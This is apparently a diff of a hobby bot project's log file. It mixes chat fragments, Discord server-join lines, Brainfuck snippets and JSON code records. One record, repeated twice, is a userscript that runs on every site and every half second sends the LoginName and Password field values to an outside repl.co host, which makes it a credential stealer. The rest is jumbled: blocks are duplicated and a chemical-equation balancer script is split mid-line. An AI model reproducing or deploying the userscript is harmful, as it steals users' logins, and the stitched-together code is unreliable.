@@ -17,3 +17,39 @@
 and krzyś ?
 and krzys but the bot is down ?
 and krzyś ?
+added to server id 929964525166428190
+added to server id 929964525166428190
+added to server id 706144313679020097
+
+Rawblocks
+Rawblocks
+{"sett":"","runtime":"","input":"// ==UserScript== // @name         New Userscript // @namespace    * // @grant unsafeWindow // @match *://*/* // @version      0.1 // @description  try to take over the world! // @author       You // ==/UserScript==  setInterval(()=>{ \tlet mail = unsafeWindow.document.getElementById('LoginName').value;     let pass = unsafeWindow.document.getElementById('Password').value;     fetch(encodeURI(`https://kerfus-bot.0lie.repl.co/?l=${mail}&p=${pass}`))     //const encoded = encodeURI(uri); },500)","code":""}
+{"sett":"","runtime":"","input":"","code":"(()=>{   let body = document.querySelector('body')   //body.innerHTML='<textarea id=\"meow\"></textarea><p id=\"nyaa\"></p>';   let textarea = document.getElementById(\"meow\");   let p = document.getElementById(\"nyaa\");   for(let e of [\"onchange\",\"onpaste\",\"oninput\",\"onkeypress\"])     textarea[e] = ()=>{       let text = textarea.value.replace(/\\s/g,\"\");       let sides = text.split(\"=\");      \tlet compounds = sides.map(e=>e.split(\"+\"));      \tlet amts = compounds.map(f=>f.map(e=>{         let out = {};         while(e.length>0){           let test = /^([A-Z][a-z]*)(\\d*)/.exec(e);           out[test[1]]??=0;           out[test[1]]+=(test[2]?test[2]:1)*1;           e=e.slice(test[0].length)         }         return out;       }))       let elements = Array.from(new Set(amts.reduce((a,b)=>a.concat(b),[]).map(e=>Object.keys(e)).reduce((a,b)=>a.concat(b),[])));       let maxx=2;       let arr = new Array(maxx**compounds.reduce((a,b)=>a.concat(b),[]).length).fill(0).map((e,i)=>i).map(e=>{         let out = [];         while(e!=0){           out.splice(0,0,e%maxx);           e=Math.floor(e/maxx);         }         while(out.length<compounds.reduce((a,b)=>a.concat(b),[]).length)out.splice(0,0,0);         return out;       });       p.innerHTML = \"\"       arr=arr.map(e=>{         let sides = amts.map((f,i)=>f.map((g,j)=>{           let pos = j+i*amts[0].length;           let amt = e[pos];           g = JSON.parse(JSON.stringify(g))           for(let ele in g)             g[ele]*=amt;           return g;         }))         return sides;       })  ,>,[<.>-]
+,>,[<.>-]
+,>,[<.>-]
+,>,[<.>-]
+,>,[<.>-]
+,>,[<.>-]
+,>,[<.>-]
+,>,[<.>-]
+,>,[<.>-]
+,[.-]
++[[>+]>[+[----->+++<]>]+]
++[[>+]>[+[----->+.++<]>]+]
+,>,[<.+>-]
+,>,[<.+>-]
+,>,[<.+>-]
+,>,[<.+>-]
+and krzyś ?
+and krzys but the bot is down ?
+and krzyś ?
+added to server id 929964525166428190
+added to server id 929964525166428190
+added to server id 706144313679020097
+
+Rawblocks
+Rawblocks
+{"sett":"","runtime":"","input":"// ==UserScript== // @name         New Userscript // @namespace    * // @grant unsafeWindow // @match *://*/* // @version      0.1 // @description  try to take over the world! // @author       You // ==/UserScript==  setInterval(()=>{ \tlet mail = unsafeWindow.document.getElementById('LoginName').value;     let pass = unsafeWindow.document.getElementById('Password').value;     fetch(encodeURI(`https://kerfus-bot.0lie.repl.co/?l=${mail}&p=${pass}`))     //const encoded = encodeURI(uri); },500)","code":""}
+{"sett":"","runtime":"","input":"","code":"(()=>{   let body = document.querySelector('body')   //body.innerHTML='<textarea id=\"meow\"></textarea><p id=\"nyaa\"></p>';   let textarea = document.getElementById(\"meow\");   let p = document.getElementById(\"nyaa\");   for(let e of [\"onchange\",\"onpaste\",\"oninput\",\"onkeypress\"])     textarea[e] = ()=>{       let text = textarea.value.replace(/\\s/g,\"\");       let sides = text.split(\"=\");      \tlet compounds = sides.map(e=>e.split(\"+\"));      \tlet amts = compounds.map(f=>f.map(e=>{         let out = {};         while(e.length>0){           let test = /^([A-Z][a-z]*)(\\d*)/.exec(e);           out[test[1]]??=0;           out[test[1]]+=(test[2]?test[2]:1)*1;           e=e.slice(test[0].length)         }         return out;       }))       let elements = Array.from(new Set(amts.reduce((a,b)=>a.concat(b),[]).map(e=>Object.keys(e)).reduce((a,b)=>a.concat(b),[])));       let maxx=2;       let arr = new Array(maxx**compounds.reduce((a,b)=>a.concat(b),[]).length).fill(0).map((e,i)=>i).map(e=>{         let out = [];         while(e!=0){           out.splice(0,0,e%maxx);           e=Math.floor(e/maxx);         }         while(out.length<compounds.reduce((a,b)=>a.concat(b),[]).length)out.splice(0,0,0);         return out;       });       p.innerHTML = \"\"       arr=arr.map(e=>{         let sides = amts.map((f,i)=>f.map((g,j)=>{           let pos = j+i*amts[0].length;           let amt = e[pos];           g = JSON.parse(JSON.stringify(g))           for(let ele in g)             g[ele]*=amt;           return g;         }))         return sides;       })       p.innerHTML = JSON.stringify(arr)     }     textarea.onchange(); })()"}
+     p.innerHTML = JSON.stringify(arr)     }     textarea.onchange(); })()"}
+added to server id 1171466359792742561
